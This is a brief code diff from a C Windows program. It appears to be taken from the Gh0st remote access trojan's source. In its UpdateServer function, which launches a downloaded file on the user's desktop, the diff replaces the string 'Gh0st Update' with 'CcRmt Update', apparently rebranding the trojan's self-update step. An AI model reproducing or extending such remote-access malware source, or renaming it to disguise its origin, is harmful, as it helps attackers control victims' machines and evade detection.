@@ -187,7 +187,7 @@ bool UpdateServer(LPCTSTR lpURL)
 	PROCESS_INFORMATION pi;
 	si.cb = sizeof si;
 	si.lpDesktop = "WinSta0\\Default"; 
-	return CreateProcess(lpFileName, "Gh0st Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
+	return CreateProcess(lpFileName, "CcRmt Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 }
 
 
